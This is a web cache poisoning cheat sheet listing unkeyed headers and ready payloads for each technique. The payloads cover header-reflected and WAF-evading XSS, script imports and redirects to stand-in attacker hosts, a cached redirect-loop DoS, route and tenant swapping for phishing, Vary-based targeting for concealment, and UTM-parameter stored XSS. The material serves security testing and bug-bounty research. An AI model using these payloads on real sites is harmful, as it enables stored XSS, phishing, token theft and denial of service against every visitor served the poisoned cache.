# 03 — Web Cache Poisoning (WCP): Unkeyed-Input Abuse

**Goal:** trap a malicious payload under a *legitimate* key. **No user interaction required.**

## Three-phase framework
1. **Map unkeyed inputs** — inject via headers/cookies/params, watch for behavioral shift. Use Param Miner (auto-buster ON) + Burp Comparer.
2. **Induce a dangerous response** — the unkeyed input must reflect in the body or affect behavior (URL gen, resource import, redirect, error, template).
3. **Trap in cache** — verify caching criteria (ext/MIME/path/status/headers), remove buster, confirm poison served to others.

**Unkeyed headers to test:**
```
X-Forwarded-Host   X-Forwarded-Proto   X-Forwarded-For   X-Forwarded-Port
X-Original-URL     X-Rewrite-URL       X-HTTP-Host-Override
X-Host   Forwarded   Origin   Referer   X-Forwarded-Scheme   X-Forwarded-Server
```
Expand with the merged 2,917-header wordlist (Param Miner + HTTP-Archive Vary).

## A. Reflected XSS via headers
```
X-Forwarded-Host: a."><script>alert(1)</script>"
```
When the page builds an OG image URL / canonical / script src from the header.

## B. Malicious resource imports
`X-Forwarded-Host: evil-user.net` when server emits `<script src="X-Forwarded-Host/…">` or CSS `@import`.

## C. Cookie-manipulation poisoning
`Cookie: language=pl` — content varies by cookie but cookie is unkeyed → a Polish page is served to everyone.

## D. Scheme headers → cacheable redirect
`X-Forwarded-Proto: http` → 301 to HTTPS, cached; redirect target may be attacker-controlled.

### D2. X-Forwarded-Scheme redirect loop (Rack/Rails, #1181946)
```
GET /assets/static/js/app.js?hackerone=poc
X-Forwarded-Scheme: http
```
Rack prioritizes `X-Forwarded-Scheme` over `X-Forwarded-Proto` → 301 loop cached by CF → DoS on any page importing that JS/CSS.

## E. DOM-based via poisoned JSON
`{"someProperty":"<svg onload=alert(1)>"}` cached and fed to a dangerous sink. Cross-origin JSON may need `Access-Control-Allow-Origin: *`.

### E2. Multi-header payload splitting + WAF bypass
When the WAF blocks whole payloads but reflects duplicate headers:
```
Cookie: gdId=xss</script%20
X-Forwarded-For: xss
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
X-Forwarded-For: >
```
`globalThis[\`al\`+/ert/.source]\`1\`` evades literal-`alert(1)` signatures.

## F. Route poisoning via internal routing headers
```
X-Original-URL: /admin      X-Rewrite-URL: /admin     (PHP/Symfony/Drupal/Zend)
```
Path swap (Unity edu→gambling):
```
GET /education?x=y  Host: store.unity.com
X-Original-URL: /gambling?x=y      → cache key /education, origin serves /gambling
```
SaaS misrouting (GoodHire/HubSpot): `X-Forwarded-Server: attacker-tenant.hs-sites.com` → origin serves attacker's tenant under victim host → stored XSS/phishing.

## G. DOM/JSON translation poisoning
`X-Forwarded-Host: attacker.net` → response `<body data-site-root="https://attacker.net/">` → frontend loads `https://attacker.net/api/i18n/en`. Poison the translation bundle:
```json
{"Show more": "<svg onload=alert(1)>"}
```
Find sinks: Burp match/replace `X-Forwarded-Host: collaborator`, browse, watch OOB hits, trace `.data()`/`fetch()`/`XHR`.

## H. Selective poisoning via Vary
`Vary: User-Agent` → poison served only to matching UA. Use for targeted attacks, concealment (rare UA), or broad coverage (cycle popular UAs). Test empirically — caches may not honor all listed Vary headers.

## I. Open Graph / social hijacking
`X-Forwarded-Host: evil.com` → `<meta property="og:url" content="https://evil.com/en"/>` → link previews point to evil.com. If page is `Cache-Control: private`, test with a session cookie (CF may cache auth traffic) and look for sibling pages set `public`.

## J. Chaining unkeyed inputs (see ref 07 for more)
```
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps        → Location: https://attacker.com/en
```
Steal CSRF tokens via cross-origin POST redirect; obtain DOM-XSS via redirected JSON; combine cookie-domain override + redirect for cross-origin cookie set.

## Unkeyed GET-parameter pollution (Omise #3183046)
CDN drops `utm_content` from key but origin reflects it:
```
GET /page?utm_content="><script>alert(1)</script>    → cache key /page → stored XSS for all
```
Fingerprint: `?cb=1` vs `?cb=2` both HIT (whole query unkeyed); `utm_content=1` vs `=2` both HIT (UTM unkeyed); try `utm_source/medium/campaign/term`, `fbclid`, `gclid`, `ref`, `referral`.
